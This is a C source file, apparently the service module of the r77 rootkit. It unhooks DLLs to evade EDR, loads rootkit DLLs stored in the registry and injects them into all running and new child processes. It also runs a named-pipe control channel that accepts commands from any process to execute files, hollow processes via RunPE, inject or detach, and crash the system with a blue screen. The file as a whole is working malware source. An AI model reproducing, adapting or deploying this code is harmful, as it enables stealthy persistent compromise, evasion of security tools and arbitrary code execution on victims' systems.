#include "Service.h"
#include "Unhook.h"
#include "r77def.h"
#include "r77win.h"
#include "r77config.h"
#include "r77process.h"
#include "r77header.h"
#include "ProcessListener.h"
#include "ControlPipeListener.h"
#include <Psapi.h>

BOOL WINAPI DllMain(_In_ HINSTANCE module, _In_ DWORD reason, _In_ LPVOID reserved)
{
	if (reason == DLL_PROCESS_ATTACH)
	{
		if (!InitializeService())
		{
			// If the r77 service could not initialize, it is either already attached, or failed to initialize, detach the DLL.
			return FALSE;
		}
	}
	else if (reason == DLL_PROCESS_DETACH)
	{
		UninitializeService();
	}

	return TRUE;
}

BOOL InitializeService()
{
	// Unhook DLL's that are monitored by EDR.
	Unhook();

	// If the service is already running (e.g. Install.exe was run twice), gracefully terminate it, and continue initialization.
	LPVOID existingServiceDetachAddress;
	if (GetR77Header(&existingServiceDetachAddress) == R77_SERVICE_SIGNATURE)
	{
		// The DetachService() function pointer to the already running r77 service is called.
		// After this function returns, the previous r77 service is completely unloaded.

		((VOID(*)())existingServiceDetachAddress)();
	}

	// Write the r77 header.
	if (!WriteR77Header(R77_SERVICE_SIGNATURE, DetachService)) return FALSE;

	EnabledDebugPrivilege();

	// Get both r77 DLL's.
	HKEY key;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_QUERY_VALUE, &key) != ERROR_SUCCESS ||
		RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, NULL, &RootkitDll32Size) != ERROR_SUCCESS ||
		RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, NULL, &RootkitDll64Size) != ERROR_SUCCESS) return FALSE;

	RootkitDll32 = NEW_ARRAY(BYTE, RootkitDll32Size);
	RootkitDll64 = NEW_ARRAY(BYTE, RootkitDll64Size);

	if (RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, RootkitDll32, &RootkitDll32Size) != ERROR_SUCCESS ||
		RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, RootkitDll64, &RootkitDll64Size) != ERROR_SUCCESS) return FALSE;

	RegCloseKey(key);

	// Create HKEY_LOCAL_MACHINE\SOFTWARE\$77config and set DACL to allow full access by any user.
	InstallR77Config();

	// When the NtResumeThread hook is called, the r77 service is notified through a named pipe connection.
	// This will trigger the following callback and the child process is injected.
	// After it's injected, NtResumeThread is executed in the parent process.
	// This way, r77 is injected before the first instruction is run in the child process.
	ChildProcessListenerThread = ChildProcessListener(ChildProcessCallback);

	// In addition, check for new processes every 100 ms that might have been missed by child process hooking.
	// This is particularly the case for child processes of protected processes (such as services.exe), because protected processes cannot be injected.
	// In the first iteration, the callback is invoked for every currently running process, making this the initial injection into all processes.
	NewProcessListenerThread = NewProcessListener(NewProcessCallback);

	// Open a named pipe to receive commands from any process.
	ControlPipeListenerThread = ControlPipeListener(ControlCallback);

	// There are no implications when injecting a process twice.
	// If the R77_SIGNATURE is already present in the target process, the newly injected DLL will just unload itself.

	// Perform startup of custom files.
	PR77_CONFIG config = LoadR77Config();

	for (DWORD i = 0; i < config->StartupFiles->Count; i++)
	{
		ShellExecuteW(NULL, L"open", config->StartupFiles->Values[i], NULL, NULL, SW_SHOW);
	}

	DeleteR77Config(config);

	return TRUE;
}
VOID UninitializeService()
{
	if (ChildProcessListenerThread)
	{
		TerminateThread(ChildProcessListenerThread, 0);
		ChildProcessListenerThread = NULL;
	}

	if (NewProcessListenerThread)
	{
		TerminateThread(NewProcessListenerThread, 0);
		NewProcessListenerThread = NULL;
	}

	RemoveR77Header();

	if (ControlPipeListenerThread)
	{
		// Terminating the control pipe thread must be the last action!
		// If this funcion was called from ControlCallback, the current thread will terminate,
		// thus, this function will cease to execute.

		TerminateThread(ControlPipeListenerThread, 0);
		ControlPipeListenerThread = NULL;
	}
}
static VOID DetachService()
{
	// A thread was created with a pointer to DetachService(), thus requesting the r77 service to remove itself gracefully.
	UninitializeService();
}

VOID ChildProcessCallback(DWORD processId)
{
	// Hook the newly created child processes before it is actually started.
	// After this function returns, the original NtResumeThread is called.

	if (!IsInjectionPaused)
	{
		InjectDll(processId, RootkitDll32, RootkitDll32Size);
		InjectDll(processId, RootkitDll64, RootkitDll64Size);
	}
}
VOID NewProcessCallback(DWORD processId)
{
	// Hook new processes that might have been missed by child process hooking.

	if (!IsInjectionPaused)
	{
		InjectDll(processId, RootkitDll32, RootkitDll32Size);
		InjectDll(processId, RootkitDll64, RootkitDll64Size);
	}
}
VOID ControlCallback(DWORD controlCode, HANDLE pipe)
{
	// The r77 service received a command from another process.

	switch (controlCode)
	{
		case CONTROL_R77_TERMINATE_SERVICE:
		{
			UninitializeService();
			break;
		}
		case CONTROL_R77_UNINSTALL:
		{
			HKEY key;
			if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
			{
				RegDeleteValueW(key, HIDE_PREFIX L"stager");
				RegDeleteValueW(key, HIDE_PREFIX L"dll32");
				RegDeleteValueW(key, HIDE_PREFIX L"dll64");
			}

			DeleteWindowsService(R77_SERVICE_NAME);
			DetachAllInjectedProcesses();
			UninstallR77Config();
			UninitializeService();
			break;
		}
		case CONTROL_R77_PAUSE_INJECTION:
		{
			IsInjectionPaused = TRUE;
			break;
		}
		case CONTROL_R77_RESUME_INJECTION:
		{
			IsInjectionPaused = FALSE;
			break;
		}
		case CONTROL_PROCESSES_INJECT:
		{
			DWORD processId;
			DWORD bytesRead;
			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
			{
				InjectDll(processId, RootkitDll32, RootkitDll32Size);
				InjectDll(processId, RootkitDll64, RootkitDll64Size);
			}

			break;
		}
		case CONTROL_PROCESSES_INJECT_ALL:
		{
			LPDWORD processes = NEW_ARRAY(DWORD, 10000);
			DWORD processCount = 0;
			if (EnumProcesses(processes, sizeof(DWORD) * 10000, &processCount))
			{
				processCount /= sizeof(DWORD);

				for (DWORD i = 0; i < processCount; i++)
				{
					InjectDll(processes[i], RootkitDll32, RootkitDll32Size);
					InjectDll(processes[i], RootkitDll64, RootkitDll64Size);
				}
			}
			break;
		}
		case CONTROL_PROCESSES_DETACH:
		{
			DWORD processId;
			DWORD bytesRead;
			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
			{
				DetachInjectedProcessById(processId);
			}

			break;
		}
		case CONTROL_PROCESSES_DETACH_ALL:
		{
			DetachAllInjectedProcesses();
			break;
		}
		case CONTROL_USER_SHELLEXEC:
		{
			WCHAR file[MAX_PATH + 1];
			WCHAR commandLine[MAX_PATH + 1];

			if (ReadFileStringW(pipe, file, MAX_PATH + 1) &&
				ReadFileStringW(pipe, commandLine, MAX_PATH + 1))
			{
				ShellExecuteW(NULL, L"open", file, commandLine, NULL, SW_SHOW);
			}
			break;
		}
		case CONTROL_USER_RUNPE:
		{
			WCHAR path[MAX_PATH + 1];
			if (ReadFileStringW(pipe, path, MAX_PATH + 1))
			{
				DWORD fileSize;
				DWORD bytesRead;
				if (ReadFile(pipe, &fileSize, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
				{
					LPBYTE file = NEW_ARRAY(BYTE, fileSize);
					if (ReadFile(pipe, file, fileSize, &bytesRead, NULL) && bytesRead == fileSize)
					{
						RunPE(path, file);
					}
					FREE(file);
				}
			}

			break;
		}
		case CONTROL_SYSTEM_BSOD:
		{
			BOOLEAN previousValue = FALSE;
			R77_RtlAdjustPrivilege(20, TRUE, FALSE, &previousValue);

			BOOLEAN oldIsCritical = FALSE;
			R77_RtlSetProcessIsCritical(TRUE, &oldIsCritical, FALSE);

			ExitProcess(0);
			break;
		}
	}
}